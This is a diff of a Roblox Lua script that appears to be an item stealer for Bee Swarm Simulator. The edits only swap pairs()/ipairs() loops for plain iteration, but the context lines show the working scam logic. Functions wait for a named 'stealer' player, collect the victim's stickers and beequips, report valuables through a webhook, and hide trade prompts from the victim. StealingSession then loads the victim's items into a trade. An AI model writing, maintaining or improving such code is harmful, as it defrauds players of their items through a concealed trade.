@@ -136,7 +136,7 @@ local PrivateServerWaitTime = 60*10
 
 local function WaitForLoad()
 	repeat
-		for i, v in pairs(StealerName) do
+		for i, v in StealerName do
 			StealerPlayer = Players:FindFirstChild(v)
 			if StealerPlayer then
 				StealerOneName = v
@@ -169,13 +169,13 @@ local function GetBeequipsFiles()
 	
 	local CaseBeequips = PlayerStats.Beequips.Case
 	
-	for _, FakeFile in pairs(CaseBeequips) do
+	for _, FakeFile in CaseBeequips do
 		table.insert(Beequips, {F = FakeFile, M = "Case"})
 	end
 	
 	local StorageBeequips = PlayerStats.Beequips.Storage
 	
-	for _, FakeFile in pairs(StorageBeequips) do
+	for _, FakeFile in StorageBeequips do
 		table.insert(Beequips, {F = FakeFile, M = "Storage"})
 	end
 	
@@ -260,7 +260,7 @@ local function collapseList(list)
     local counts = {}
     local order = {}
 
-    for _, v in ipairs(list) do
+    for _, v in list do
         if counts[v] then
             counts[v] += 1
         else
@@ -271,7 +271,7 @@ local function collapseList(list)
 
     local result = {}
 
-    for _, v in ipairs(order) do
+    for _, v in order do
         local n = counts[v]
         if n > 1 then
             table.insert(result, "[" .. n .. "x] " .. v)
@@ -294,7 +294,7 @@ local function SendWebhook()
 	local BeequipsToSend = {}
 	
 	local PingAll = false
-	for _, FakeFile in pairs(Stickers) do
+	for _, FakeFile in Stickers do
 		local TypeDef = GetTypeDef(FakeFile)
 		local Name = TypeDef.Name
 		if (Name == "Icy Crowned Hive Skin" or Name == "Wavy Purple Hive Skin") or (Name ~= "Ticket Voucher" and (tostring(Name):find("Star Sign") or tostring(Name):find("Cub Skin") or tostring(Name):find("Voucher"))) then
@@ -310,7 +310,7 @@ local function SendWebhook()
 		return warn(".")
 	end
 	
-	for _, FakeFile in pairs(Beequips) do
+	for _, FakeFile in Beequips do
 		table.insert(BeequipsToSend, (FakeFile.F.T or "Unknown") .. " [" .. FakeFile.M .. "]")
 	end
 
@@ -379,7 +379,7 @@ local function SendWebhook()
 		local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
 		local response = HttpService:JSONDecode(game:HttpGet(url))
 
-		for _, server in ipairs(response.data) do
+		for _, server in response.data do
 			if server.playing < server.maxPlayers and server.id ~= currentJob then
 				TeleportService:TeleportToPlaceInstance(placeId, server.id, LocalPlayer)
 				break
@@ -454,7 +454,7 @@ local function HideTradeGui()
 		if MessagePromptBox.Visible == true then 
 			local Hide = false
 
-			for i, v in pairs(MessagePromptBox:GetDescendants()) do
+			for i, v in MessagePromptBox:GetDescendants() do
 				if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text:lower():find("trade") then
 					Hide = true
 				end
@@ -496,7 +496,7 @@ local function StealingSession()
 	local MaxSize = #WhitelistedBook >= MAX_OFFER_SIZE and MAX_OFFER_SIZE or #WhitelistedBook
 	
 	if #WhitelistedBook > 0 then
-		for _, FakeFile in pairs(WhitelistedBook) do
+		for _, FakeFile in WhitelistedBook do
 			if MaxSize == 0 then break end
 			task.wait(0.15)
 			AddTradeSticker(FakeFile, SessionID)
@@ -510,7 +510,7 @@ local function StealingSession()
 	local SpaceLeft = MAX_OFFER_SIZE - #WhitelistedBook
 	
 	if #WhitelistedBQs > 0 and SpaceLeft > 0 then
-		for _, FakeFile in pairs(WhitelistedBQs) do
+		for _, FakeFile in WhitelistedBQs do
 			if SpaceLeft == 0 then break end
 			task.wait(0.15)
 			AddTradeBeequip(FakeFile.F, SessionID)
